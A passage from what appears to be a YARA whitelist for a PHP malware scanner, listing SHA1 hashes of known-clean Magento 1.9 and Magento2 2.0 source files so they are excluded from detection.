		hash.sha1(0, filesize) == "e810f8d584b0ad3e43d7ab15fda1c666a466df85" or // lib/Mage/Autoload/Simple.php
		hash.sha1(0, filesize) == "da92179998e43536f4439c3fdc0eb51cc4db96b7" or // lib/Varien/Pear.php
		hash.sha1(0, filesize) == "fb0b0bf5cef93f8c817dad5872ce245f3d96d32d" or // lib/Varien/Autoload.php
		hash.sha1(0, filesize) == "782c7d8f1a2b06e5da59d0862766c6ba2b25f28e" or // lib/Varien/Data/Form/Element/Gallery.php
		hash.sha1(0, filesize) == "d6fdfc01c4644292bd08f73f19f2dc539536de2c" or // lib/Varien/Data/Form/Element/Multiline.php
		hash.sha1(0, filesize) == "c7d2ea2c3bd0ba9854630e3e63a950765c14f1bf" or // lib/Varien/File/Uploader.php
		hash.sha1(0, filesize) == "24dc54b5710bc353e5b3f493af8d3f18e99a2c3a" or // lib/Varien/Db/Tree.php
		
		/* Magento CE 1.9.2.0 */
		hash.sha1(0, filesize) == "f9cc4c1a62436372f245fdda6a0a37e7df4a9cdb" or // cron.php
		hash.sha1(0, filesize) == "dd414df47f283a6db73cef174ab8e526512b64b8" or // lib/Zend/Tool/Project/Provider/Test.php
		hash.sha1(0, filesize) == "b8519e3973a2a0504942f31f905f7a6e9c533f63" or // lib/Zend/Validate/File/MimeType.php
		hash.sha1(0, filesize) == "89765ac6cbadcd08f693cd9f7557e42d90380313" or // lib/Zend/Locale/Format.php
		hash.sha1(0, filesize) == "72517e19f04eda76e203868603b3b5132d4ef9d7" or // lib/Zend/Locale/Data.php
		hash.sha1(0, filesize) == "dbc4bbfaecf84eeb4bf5c99c3e359bbbf32803be" or // lib/Zend/Soap/Client.php
		hash.sha1(0, filesize) == "b3f0a13af9d17e7ced224584c6447505586fdd1a" or // lib/Zend/Serializer/Adapter/PhpCode.php
		hash.sha1(0, filesize) == "a391b6abaf40851177c2a634c894a44a0fdcbd2d" or // lib/Zend/Amf/Server.php
		hash.sha1(0, filesize) == "227da1e56588f1d2c02ab5dd81784f1d38a5be5d" or // lib/Zend/Date/DateObject.php
		
		/* Magento CE 1.9.2.1 */
		
		/* Magento CE 1.9.2.2 */
		hash.sha1(0, filesize) == "9283d2576949b018bcc38dd35c28e4bf2d609db1" or // cron.php
		hash.sha1(0, filesize) == "66503bf10b6b58265728cc6e9b6d564bf5149bf2" or // lib/Zend/Session.php
		hash.sha1(0, filesize) == "0bab49baadf98015bfea963e0d9ae5944bec1233" or // lib/Zend/Locale/Data.php
		hash.sha1(0, filesize) == "b58925a24d9201f4efbc0f59782b2b99367ec006" or // lib/Zend/Amf/Server.php
		hash.sha1(0, filesize) == "7c00d311a20e650dccf8dff9d2eb346077ff91eb" or // lib/Zend/Date/DateObject.php
		
		/* Magento CE 1.9.2.3 */
		hash.sha1(0, filesize) == "19dbc4997004bb618bcc7b1e76b572424c7c93d1" or // cron.php
		hash.sha1(0, filesize) == "0989b6d28e5238a966d6333299750251f6621cf4" or // app/code/core/Mage/ImportExport/Model/Import/Uploader.php
		hash.sha1(0, filesize) == "3d8a99b05b05488ad1c89c249712dc1e45e9d1be" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Customer.php
		hash.sha1(0, filesize) == "2510ea6f36a7824721ef930bd3b34cb19b5a623a" or // app/code/core/Mage/ImportExport/Model/Export/Entity/Product/Type/Abstract.php
		hash.sha1(0, filesize) == "61c48e91b39b227207d857276ad43208a517f31a" or // app/code/core/Mage/CatalogRule/sql/catalogrule_setup/mysql4-upgrade-0.7.1-0.7.2.php
		hash.sha1(0, filesize) == "e25d06c0cae8b8e5992b28014d7e1de33b97ab3b" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "531a0be26ca6b9444ab714983fe9727826f9a1bd" or // app/code/core/Mage/Core/Model/Layout.php
		hash.sha1(0, filesize) == "91a98939132e7b67dd9c5d9d1aa7278cc9356922" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "3173f1e7f8889b01bccf4b64ea98e8e9ea212883" or // app/code/core/Mage/Adminhtml/Model/Url.php
		hash.sha1(0, filesize) == "7229c6ac1a40b4e97e1ff0274a85b33ae3a3ae56" or // app/design/frontend/default/iphone/template/catalog/product/view/media.phtml
		hash.sha1(0, filesize) == "6e6978736bd02faf3350f54fd0711abda85995af" or // app/design/frontend/base/default/template/customer/widget/dob.phtml
		hash.sha1(0, filesize) == "2ade0c0fe3ba96238bcc8d9e486316ebebbc543d" or // app/design/adminhtml/default/default/template/notification/toolbar.phtml
		hash.sha1(0, filesize) == "06412e5959c3d322cf0702cd2533d6e89cc64b1e" or // lib/Magento/Autoload/Simple.php
		hash.sha1(0, filesize) == "1c7302f33d227f8bbb8e7dba6f45cacfa353a1e0" or // lib/Mage/Autoload/Simple.php
		hash.sha1(0, filesize) == "f60b8ccc6af994fcb5390858d913c6894daf8d6a" or // lib/Varien/Pear.php
		hash.sha1(0, filesize) == "e67dbb73a945ced9ca3b139b4bb9634d49890494" or // lib/Varien/Autoload.php
		hash.sha1(0, filesize) == "a3b95117cb53b32f15933a323d0caecb28ba8f59" or // lib/Varien/Data/Form/Element/Gallery.php
		hash.sha1(0, filesize) == "eddcb2ed2b259b3bc0819316a3f82e8e765010e3" or // lib/Varien/Data/Form/Element/Multiline.php
		hash.sha1(0, filesize) == "c0db9c81f156724e5b34ce33bf584d7af6d9ec0b" or // lib/Varien/File/Uploader.php
		hash.sha1(0, filesize) == "4bf65c05b7f31d0b068a9586b3384f37818e83ba" or // lib/Varien/Db/Tree.php
		
		/* Magento CE 1.9.2.4 */
		hash.sha1(0, filesize) == "1b93c2a04a83e7577623ee4af05c428819cb7c16" or // lib/Varien/File/Uploader.php
		
		/* Magento CE 1.9.3.0 */
		hash.sha1(0, filesize) == "3f1c255821b6a821dabca2dc02bd0d88ce19a2b2" or // cron.php
		hash.sha1(0, filesize) == "6e9a284038a3e121052e5ff3b69d580dc3dbd387" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "b2e8d4ed802a50d96711e73db12ef9e6225fd6ce" or // lib/Varien/Autoload.php
		
		/* Magento CE 1.9.3.1 */
		
		/* Magento CE 1.9.3.2 */
		hash.sha1(0, filesize) == "a5f4b3b79113406a25803258e67955ecaef58f96" or // cron.php
		hash.sha1(0, filesize) == "b59a9f79f93104dd0f2086ecb41b121ca83c49c5" or // app/code/core/Mage/CatalogRule/sql/catalogrule_setup/mysql4-upgrade-0.7.1-0.7.2.php
		hash.sha1(0, filesize) == "10396708b76cffb8e5ec478e138668fe7f7fb08e" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "c3cc023db136ab16195a00821c28def911e5aa22" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "0c5c35de2e11051a72842dec7fa77279076c7107" or // app/code/core/Mage/Adminhtml/Model/Url.php
		hash.sha1(0, filesize) == "6da6474df8515b58505301368d64b054a973be87" or // app/design/frontend/default/iphone/template/catalog/product/view/media.phtml
		hash.sha1(0, filesize) == "db22a8c5bac3dfecfd67be8cbb856256ce005e03" or // app/design/frontend/base/default/template/customer/widget/dob.phtml
		hash.sha1(0, filesize) == "c78c97ee710b3ece67398146c337593d208b763a" or // app/design/adminhtml/default/default/template/notification/toolbar.phtml
		hash.sha1(0, filesize) == "c395f8c60434160d0a4fdca0a9981eb4c6a13021" or // lib/Magento/Autoload/Simple.php
		hash.sha1(0, filesize) == "9163281f49361481293a54155b48a18f502679ea" or // lib/Mage/Autoload/Simple.php
		hash.sha1(0, filesize) == "6c577b685ed6a73c08abaabef945070c722e14f9" or // lib/Varien/Pear.php
		hash.sha1(0, filesize) == "5d7e38bd1345fa0afc6e0c1f2eec085d556da06a" or // lib/Varien/Autoload.php
		hash.sha1(0, filesize) == "cd52d865f0d58fe0fa993b3aaa134ed86b4ddd87" or // lib/Varien/Data/Form/Element/Gallery.php
		hash.sha1(0, filesize) == "a80a3a304b0abd1732e704ccc3b8f4816605052b" or // lib/Varien/Data/Form/Element/Multiline.php
		hash.sha1(0, filesize) == "c1cbd9d692c66deed9c4419c6c78491292aec5a0" or // lib/Varien/Db/Tree.php
		
		/* Magento CE 1.9.3.3 */
		
		/* Magento CE 1.9.3.4 */
		
		/* Magento CE 1.9.3.6 */
		hash.sha1(0, filesize) == "45ffcf03c297d29169d2fd00790ff8eb83ef5fec" or // app/code/core/Zend/Serializer/Adapter/PhpCode.php
		hash.sha1(0, filesize) == "294d413697f3461aa1b20dab404040eb483cec95" or // app/design/adminhtml/default/default/template/notification/toolbar.phtml
		
		/* Magento CE 1.9.3.7 */
		
		/* Magento CE 1.9.3.8 */
		hash.sha1(0, filesize) == "fb7414b830abc653d624019a18689d4dd69d7f90" or // cron.php
		hash.sha1(0, filesize) == "06f0a6333273222b5e39b7e9e8c5e3ef764d639b" or // app/code/core/Mage/CatalogRule/sql/catalogrule_setup/mysql4-upgrade-0.7.1-0.7.2.php
		hash.sha1(0, filesize) == "8bb1ce05c51baff0b8fe24c4320e22fcd18bbc47" or // app/code/core/Mage/Core/Model/Translate.php
		hash.sha1(0, filesize) == "b4aab58ed7efbe7aa809c1aae2fe90494a3d403e" or // app/code/core/Mage/Dataflow/Model/Profile.php
		hash.sha1(0, filesize) == "28f900ea871d38dfdb5347f1c9861a7621825a2d" or // app/code/core/Mage/Adminhtml/Model/Url.php
		hash.sha1(0, filesize) == "7d84d41fee5ec9e6825654a1ef4ea785bb1eda29" or // app/design/frontend/default/iphone/template/catalog/product/view/media.phtml
		hash.sha1(0, filesize) == "7ae589b2fa62b74e0075da5c5c3cba8282df7c4c" or // app/design/frontend/base/default/template/customer/widget/dob.phtml
		hash.sha1(0, filesize) == "fd489abda5b880c3c24fd48f7f8388917a119c19" or // app/design/adminhtml/default/default/template/notification/toolbar.phtml
		hash.sha1(0, filesize) == "ca8a29edddc5deccc47e95da68a20d557abd7621" or // lib/Magento/Autoload/Simple.php
		hash.sha1(0, filesize) == "7035f2cfad6f0936bd5c533fa26379440484c82c" or // lib/Mage/Autoload/Simple.php
		hash.sha1(0, filesize) == "79ee56a5b2a661467cf0b90060e98085a94bcd91" or // lib/Varien/Pear.php
		hash.sha1(0, filesize) == "b6abca064319d3f94430b0545e5d2e1eec4e1ea7" or // lib/Varien/Autoload.php
		hash.sha1(0, filesize) == "476d8b4554f8bf9cfe6d77c056eaf201eee1348a" or // lib/Varien/Data/Form/Element/Gallery.php
		hash.sha1(0, filesize) == "78694d3161b6dee34635eaf3dda65259d0045443" or // lib/Varien/Data/Form/Element/Multiline.php
		hash.sha1(0, filesize) == "14551c7936764a457729f2ceba437f6c4e829fbd" or // lib/Varien/Db/Tree.php
		
		/* Magento CE 1.9.3.9 */
		hash.sha1(0, filesize) == "b6b6747a3d7f3f54e150fbfc0ae9f22068276f57" or // cron.php
		
		false
}
/* Copyright (C) NBS System - All Rights Reserved
   Licensed under GNU LGPL v3.0 – See the LICENSE notice for details
*/
import "hash"
private rule Magento2 : ECommerce
{
	condition:
		/* Magento2 2.0.0 */
		hash.sha1(0, filesize) == "cd1002f845b67164d3cda344124f1f7d9d22019e" or // app/code/Magento/Backend/Model/Url.php
		hash.sha1(0, filesize) == "d4ec772ebaa46f66f7ee12d31258bece6a1a416d" or // app/code/Magento/Downloadable/view/adminhtml/templates/product/edit/downloadable/samples.phtml
		hash.sha1(0, filesize) == "8145a57a795ba1a377fdd9ea6bb55174d17239ba" or // app/code/Magento/Customer/Test/Unit/Controller/Account/EditPostTest.php
		hash.sha1(0, filesize) == "2d9966b5c02e42eedd670f12fff2d92969973eae" or // app/code/Magento/Catalog/Model/Product/Image.php
		hash.sha1(0, filesize) == "75f7eee0f3d16e2b415bb2866b22df71d209c38b" or // dev/tests/js/JsTestDriver/run_js_tests.php
		hash.sha1(0, filesize) == "ade287d950958ff32c35d8243139bd3605fe992b" or // dev/tests/api-functional/framework/bootstrap.php
		hash.sha1(0, filesize) == "a3eaabc2edf427e480b62029b89d61643a0c19fa" or // dev/tests/integration/framework/bootstrap.php
		hash.sha1(0, filesize) == "690cfdb0e5273fa0ec92463ba1356b84edeb2359" or // dev/tests/integration/testsuite/Magento/Framework/Image/Adapter/InterfaceTest.php
		hash.sha1(0, filesize) == "dcc5b6e3b86d741dd55eb9e0b8c337157eedd6e8" or // dev/tests/static/testsuite/Magento/Test/Legacy/ObsoleteCodeTest.php
		hash.sha1(0, filesize) == "81bacb155d372b44c86205af20156ddfb59efab9" or // dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php
		hash.sha1(0, filesize) == "5b286341ce1c6ff499e6a1c195355bb5de123cd9" or // dev/tests/static/testsuite/Magento/Test/Integrity/DependencyTest.php
		hash.sha1(0, filesize) == "97a69099eb1def6f1c3024e0ad7ff8051deb0a13" or // lib/web/tiny_mce/tiny_mce_jquery_src.js
		hash.sha1(0, filesize) == "477d7865ac4f9d0746a239bfb27e399a990dd49b" or // lib/web/tiny_mce/tiny_mce_prototype_src.js
		hash.sha1(0, filesize) == "e11ba669cf8d4e4dd657ce12dce82cd3fd0515e2" or // lib/web/tiny_mce/tiny_mce_src.js
		hash.sha1(0, filesize) == "664fa0e4fa71b881e313cd0ee10ef39cd2d58e65" or // lib/internal/Magento/Framework/Shell.php
		hash.sha1(0, filesize) == "093bb21d65d7828c182d4b1e6cfee6eb02847aff" or // lib/internal/Magento/Framework/View/Design/Theme/Validator.php
		hash.sha1(0, filesize) == "a76a56301cf6916e4435805c758faf1265548261" or // lib/internal/Magento/Framework/View/Model/Layout/Merge.php
		hash.sha1(0, filesize) == "72ec17234a61986a36c8f10dbc5f95999896057a" or // lib/internal/Magento/Framework/Filter/Test/Unit/TranslitTest.php
		hash.sha1(0, filesize) == "f0c3ea5c50c763aec35ee7db0e27e9cad7eff01e" or // lib/internal/Magento/Framework/Api/Code/Generator/ExtensionAttributesGenerator.php
		hash.sha1(0, filesize) == "313d2394605796c06a935527499280173124fb6b" or // lib/internal/Magento/Framework/Validator/Constraint/Option/Callback.php
		hash.sha1(0, filesize) == "2421888cd70ba01de6320072d35a101110945455" or // setup/src/Magento/Setup/Module/I18n/Dictionary/Phrase.php
		hash.sha1(0, filesize) == "0a0ae6ff41e93076c78781509ff2151d5b799a6a" or // vendor/zendframework/zend-config/src/Reader/Json.php
		hash.sha1(0, filesize) == "62e0f4887818cb01fb3dd7f2dcc1dac74742fcb1" or // vendor/zendframework/zend-config/src/Reader/Yaml.php
		hash.sha1(0, filesize) == "b163b6e8d6700dcca6451c5c452ea5c1bbd687e4" or // vendor/zendframework/zend-config/src/Reader/Ini.php
		hash.sha1(0, filesize) == "502966548aa12798e152637e253ddbd06b9544fa" or // vendor/zendframework/zend-config/src/Reader/JavaProperties.php
		hash.sha1(0, filesize) == "1184cdbe3ac63e2aadbd826f2146a085f9ca2094" or // vendor/zendframework/zend-i18n/src/Validator/IsFloat.php
		hash.sha1(0, filesize) == "b0af434ee995d7e49ec49098313d1b0de6e73c04" or // vendor/zendframework/zend-view/src/Helper/Navigation/AbstractHelper.php
		hash.sha1(0, filesize) == "b5a4b8248d608a4b1529e5953aaa573b0f22fb2c" or // vendor/zendframework/zend-serializer/src/Adapter/PhpCode.php
		hash.sha1(0, filesize) == "8c6ada59a4fef5b955a181b57352ac777d8414fc" or // vendor/zendframework/zend-validator/src/File/MimeType.php
		hash.sha1(0, filesize) == "000e0740938ef378705e751d8944b3c0ec3bdd9a" or // vendor/zendframework/zend-soap/src/Client.php
		hash.sha1(0, filesize) == "32266eb7343a11f4e7f8bd624a3ea6fc73628a58" or // vendor/oyejorge/less.php/lib/Less/Tree/Unit.php
		hash.sha1(0, filesize) == "3e4f63564a1d258b0a5723dbb81f1733c619cbcd" or // vendor/oyejorge/less.php/lib/Less/Tree/Dimension.php
		hash.sha1(0, filesize) == "06ce307f197a9d31a553b002183d073115ff803e" or // vendor/tubalmartin/cssmin/cssmin.php
		hash.sha1(0, filesize) == "f152f31d6f97f24d227cd51347d583c144bf167d" or // vendor/phpseclib/phpseclib/phpseclib/Net/SSH2.php
		hash.sha1(0, filesize) == "9182cd008814b95a86c5c9d318734330617c92e5" or // vendor/phpseclib/phpseclib/phpseclib/Net/SSH1.php
		hash.sha1(0, filesize) == "c02e4456afe25282720295660e52ee5f3f32b328" or // vendor/monolog/monolog/src/Monolog/Formatter/LineFormatter.php
		hash.sha1(0, filesize) == "172be2895cb70436fc146e7564966dce4f96e08a" or // vendor/symfony/console/Symfony/Component/Console/Application.php
		hash.sha1(0, filesize) == "a1b4f3d95eb18abd284aadd40097462838143a8e" or // vendor/symfony/console/Symfony/Component/Console/Tests/Helper/LegacyProgressHelperTest.php
		hash.sha1(0, filesize) == "3d32ace32fa8e80189192ea1d0853b8224fcae7a" or // vendor/symfony/console/Symfony/Component/Console/Tests/Helper/ProgressBarTest.php
		hash.sha1(0, filesize) == "725a80e1da25907af517807f62e25fc76fd7cf65" or // vendor/symfony/process/Process.php
		hash.sha1(0, filesize) == "abe477d884c40043013e4b08501acff5351b5539" or // vendor/symfony/process/Tests/ExecutableFinderTest.php
		hash.sha1(0, filesize) == "a3b7be20d89f5d8e37024c118cbbc8492688ec03" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "a9d0c26df1fc39e7e8be5bfa51051b412c5f7403" or // vendor/squizlabs/php_codesniffer/CodeSniffer.php
		hash.sha1(0, filesize) == "76f1af35b350e0e8d1ac6d288c01d35572e3ee4a" or // vendor/squizlabs/php_codesniffer/CodeSniffer/Reports/Emacs.php
		hash.sha1(0, filesize) == "e2f190b4a5013d53449517377e1fe0dacd6e8ec6" or // vendor/squizlabs/php_codesniffer/scripts/phpcs
		hash.sha1(0, filesize) == "f2672f96d0143bbfe3a98fa95859df401a6eff76" or // vendor/seld/jsonlint/bin/jsonlint
		hash.sha1(0, filesize) == "057f48d63e8a02d6c83a9eb5bba81b087db79f51" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tokenizer/Transformer/DynamicVarBrace.php
		hash.sha1(0, filesize) == "bac1ed101e3c7880145c9ce6cf908b179b57e9c7" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Fixer/Symfony/PhpdocShortDescriptionFixer.php
		hash.sha1(0, filesize) == "1320c4b30065e82d2c9ed373a7a3975fc5c36416" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Tokenizer/TokensTest.php
		hash.sha1(0, filesize) == "1378de5151bda1f9e00b101d140ad2ca17660ba7" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Tokenizer/Transformer/DynamicVarBraceTest.php
		hash.sha1(0, filesize) == "f4aae1c84c801b8910c31c7d9167a232333444c1" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/PSR2/BracesFixerTest.php
		hash.sha1(0, filesize) == "f6d440287bdcd1d5198a3e5c12c11cc2900cc611" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/NewWithBracesFixerTest.php
		hash.sha1(0, filesize) == "4fe50dc31b47006753a33f114314132f452ecea8" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/TrimArraySpacesFixerTest.php
		hash.sha1(0, filesize) == "a2348096bec192beac0c0ab29ead03526b5d3009" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/PreIncrementFixerTest.php
		hash.sha1(0, filesize) == "289ae53f03114fdf9cf561f61dab5993f5f24098" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/JoinFunctionFixerTest.php
		hash.sha1(0, filesize) == "ad1a6ff2c74fd6a23ee431e6231aa834fc33bb0a" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Contrib/PhpUnitStrictFixerTest.php
		hash.sha1(0, filesize) == "ee168846484382604d4cd4cf2e9518a1ede818a8" or // vendor/magento/zendframework1/library/Zend/Session.php
		hash.sha1(0, filesize) == "b56421a26a863d08d4e18f69df234193ff351990" or // vendor/magento/zendframework1/library/Zend/Tool/Project/Provider/Test.php
		hash.sha1(0, filesize) == "86fe4608ce0b8c6a2250d485367a5f3521c6719b" or // vendor/magento/zendframework1/library/Zend/Locale/Format.php
		hash.sha1(0, filesize) == "17a96b1806cf7b20fde6f2fefc0100f0b104f3af" or // vendor/magento/zendframework1/library/Zend/Amf/Server.php
		hash.sha1(0, filesize) == "68e59449682a298d61609310d35205d5a3f789e6" or // vendor/magento/zendframework1/library/Zend/Date/DateObject.php
		hash.sha1(0, filesize) == "d01269880c68befd36f0edd8857b6b1d05965f20" or // vendor/magento/zendframework1/resources/languages/ja/Zend_Validate.php
		hash.sha1(0, filesize) == "82485c8d519d5b9947a37fffea10839db45c0fc9" or // vendor/magento/zendframework1/resources/languages/sk/Zend_Validate.php
		hash.sha1(0, filesize) == "4f16e01f1d672fa79fed63829dabac27fc56afca" or // vendor/magento/zendframework1/resources/languages/uk/Zend_Validate.php
		hash.sha1(0, filesize) == "bc6be8a711dd231d337b2bfb1dc6ea133f084055" or // vendor/magento/zendframework1/resources/languages/pt_BR/Zend_Validate.php
		hash.sha1(0, filesize) == "6e439473653593eb82620d898446349e2f39d941" or // vendor/magento/zendframework1/resources/languages/es/Zend_Validate.php
		hash.sha1(0, filesize) == "8e3726607b9b1e6dd2f6206ce6abd6e9733a3fff" or // vendor/magento/zendframework1/resources/languages/ru/Zend_Validate.php
		hash.sha1(0, filesize) == "838921b7c6897052e0472eeae4f1ea49da29c99d" or // vendor/magento/zendframework1/resources/languages/cs/Zend_Validate.php
		hash.sha1(0, filesize) == "3ce2c232924e5d44ea207f7636e65151f4bd4044" or // vendor/composer/composer/src/Composer/Util/Git.php
		hash.sha1(0, filesize) == "8050fbdd2f773e765a0c9148a8fee12a15eae74d" or // vendor/composer/composer/src/Composer/Command/ConfigCommand.php
		hash.sha1(0, filesize) == "bd10a894c29ab5e64bae971ce159c00937a7efed" or // vendor/pdepend/pdepend/src/bin/pdepend
		hash.sha1(0, filesize) == "f2672f96d0143bbfe3a98fa95859df401a6eff76" or // vendor/bin/jsonlint
		hash.sha1(0, filesize) == "e2f190b4a5013d53449517377e1fe0dacd6e8ec6" or // vendor/bin/phpcs
		hash.sha1(0, filesize) == "bd10a894c29ab5e64bae971ce159c00937a7efed" or // vendor/bin/pdepend
		hash.sha1(0, filesize) == "ccc9ec282ac5acb1ed551a5fa9dcb63527841750" or // vendor/bin/phpmd
		hash.sha1(0, filesize) == "6ccac6cef15b10b993da3117f6033b5a29bc738f" or // vendor/phpunit/phpunit/src/Framework/TestCase.php
		hash.sha1(0, filesize) == "ccc9ec282ac5acb1ed551a5fa9dcb63527841750" or // vendor/phpmd/phpmd/src/bin/phpmd
		
		/* Magento2 2.0.1 */
		hash.sha1(0, filesize) == "add333a8137ccbb305ecf60c3e55e28768c0f237" or // dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php
		hash.sha1(0, filesize) == "8abc8a07ab38ad2da15c2061c816ff638f0e0f95" or // setup/src/Magento/Setup/Module/I18n/Dictionary/Phrase.php
		hash.sha1(0, filesize) == "bb3d5b5058774b99326162a971064e770c1d400a" or // vendor/symfony/process/Process.php
		hash.sha1(0, filesize) == "e11d7e94c9046166ced9717f1730df4f538358b2" or // vendor/symfony/process/Tests/ExecutableFinderTest.php
		hash.sha1(0, filesize) == "3ee3d886ac2431ce94b3d9863754b22eb59f10d5" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "696f1493509991c965fb042b9a80f72974023b8c" or // vendor/symfony/filesystem/Tests/FilesystemTest.php
		hash.sha1(0, filesize) == "368d7d21730e6d765c32ff201851db00b354ae51" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Fixer/Symfony/PhpdocShortDescriptionFixer.php
		hash.sha1(0, filesize) == "0d1fccb67a37a28e258bd0697b99c225ee95fc51" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Tokenizer/TokensTest.php
		hash.sha1(0, filesize) == "c51e1406b80f46f270901d0b02ea381ad709b95e" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/PSR2/BracesFixerTest.php
		hash.sha1(0, filesize) == "4cfae7375a5a512354d644cc4d2a2fb590077dd3" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/UnneededControlParenthesesFixerTest.php
		hash.sha1(0, filesize) == "a34bb133f5f3b5bc332078dae3cf0b667a25c2ba" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/ArrayElementWhiteSpaceAfterCommaFixerTest.php
		hash.sha1(0, filesize) == "11b2a61513faf81855fb2634fce23697618923c1" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/ArrayElementNoSpaceBeforeCommaFixerTest.php
		hash.sha1(0, filesize) == "09fa34dd77324cf97b547387a896f0ddc993385a" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/NewWithBracesFixerTest.php
		hash.sha1(0, filesize) == "da8346240d2012a694fa17a56c752e7211caafbf" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/TrimArraySpacesFixerTest.php
		hash.sha1(0, filesize) == "e69fd602a11eaf6f93a2928e9149ef25452f2643" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/ShortBoolCastFixerTest.php
		hash.sha1(0, filesize) == "2a88325ec2919a393b0d13e2bd8a39aed38d089c" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Contrib/PhpUnitStrictFixerTest.php
		hash.sha1(0, filesize) == "d0734194883ed7cbea57e363fecaeeb6d8d00e69" or // vendor/pdepend/pdepend/src/bin/pdepend
		hash.sha1(0, filesize) == "d0734194883ed7cbea57e363fecaeeb6d8d00e69" or // vendor/bin/pdepend
		
		/* Magento2 2.0.2 */
		hash.sha1(0, filesize) == "233f56fc60f40597126ac6da5a255ed2da65fa20" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/UnneededControlParenthesesFixerTest.php
		hash.sha1(0, filesize) == "0a5d3ab4932430db2bcd5897a94a837f2b5d4a62" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/NewWithBracesFixerTest.php
		
		/* Magento2 2.0.3 */
		hash.sha1(0, filesize) == "f3fd57943825e6195963c1ebbbc73744cc997ca3" or // app/code/Magento/Backend/Model/Url.php
		hash.sha1(0, filesize) == "cb814a8f56085e7238010cc3c743cb6fa9249bb6" or // app/code/Magento/Downloadable/view/adminhtml/templates/product/edit/downloadable/samples.phtml
		hash.sha1(0, filesize) == "19822e59997bc8ba37d4ee8fd4a9c8cd7a1a88a1" or // app/code/Magento/Customer/Test/Unit/Controller/Account/EditPostTest.php
		hash.sha1(0, filesize) == "fcdadb38653801c605180fa7bc3da5ffe7a78108" or // app/code/Magento/Catalog/Model/Product/Image.php
		hash.sha1(0, filesize) == "381606c98428f5f1f1688861b9bb5b86573882ae" or // dev/tests/js/JsTestDriver/run_js_tests.php
		hash.sha1(0, filesize) == "fffb094a2d2f8f4e0f2f1ece46839055c3e5bcdd" or // dev/tests/api-functional/framework/bootstrap.php
		hash.sha1(0, filesize) == "6b1207354e632ed5ff9d997673b1b8b7491e4830" or // dev/tests/integration/framework/bootstrap.php
		hash.sha1(0, filesize) == "073be1c00c938479a0daa737e8a2db25c051b33f" or // dev/tests/integration/testsuite/Magento/Framework/Image/Adapter/InterfaceTest.php
		hash.sha1(0, filesize) == "a04c54d0bdd22c2033cc50a06866845763b18b51" or // dev/tests/static/testsuite/Magento/Test/Legacy/ObsoleteCodeTest.php
		hash.sha1(0, filesize) == "571c65fda0b3baea7206430a87cbfcbba45e8f26" or // dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php
		hash.sha1(0, filesize) == "892b8581b6f16d00ed67bbbe6647eac9ed5047a3" or // dev/tests/static/testsuite/Magento/Test/Integrity/DependencyTest.php
		hash.sha1(0, filesize) == "a46cd4176871076df0e7d9edd4d469cdc5414833" or // lib/internal/Magento/Framework/Shell.php
		hash.sha1(0, filesize) == "dbbf248c80845164bfee1165820a32b8f855b1fd" or // lib/internal/Magento/Framework/View/Design/Theme/Validator.php
		hash.sha1(0, filesize) == "448a05674ff22088e7e7944224d78dd958836169" or // lib/internal/Magento/Framework/View/Model/Layout/Merge.php
		hash.sha1(0, filesize) == "d1f98d5d8f6c883fa76605b7e50efddb6b73a40d" or // lib/internal/Magento/Framework/Filter/Test/Unit/TranslitTest.php
		hash.sha1(0, filesize) == "0bcbc44d143cba85713ffd3d6638294accb3cdba" or // lib/internal/Magento/Framework/Api/Code/Generator/ExtensionAttributesGenerator.php
		hash.sha1(0, filesize) == "ed5b0a09cefc83fedad57a7c79cd35f261c90e2b" or // lib/internal/Magento/Framework/Validator/Constraint/Option/Callback.php
		hash.sha1(0, filesize) == "f3134582915a58e81289505201db72e55981a787" or // vendor/symfony/process/Process.php
		hash.sha1(0, filesize) == "e1ef41c3d01cb1ada488ff1509beff743f5b0d86" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "11464980c1753f0169ba1d5d90d1f347604fe36d" or // vendor/symfony/filesystem/Tests/FilesystemTest.php
		hash.sha1(0, filesize) == "a42a7f37f5e84cd11e0359f22d89ea486e3be903" or // vendor/sebastian/environment/src/Console.php
		
		/* Magento2 2.0.4 */
		
		/* Magento2 2.0.5 */
		
		/* Magento2 2.0.6 */
		hash.sha1(0, filesize) == "75f761fcdd8675aee7d190e31031be5912cd82c0" or // vendor/symfony/process/Process.php
		
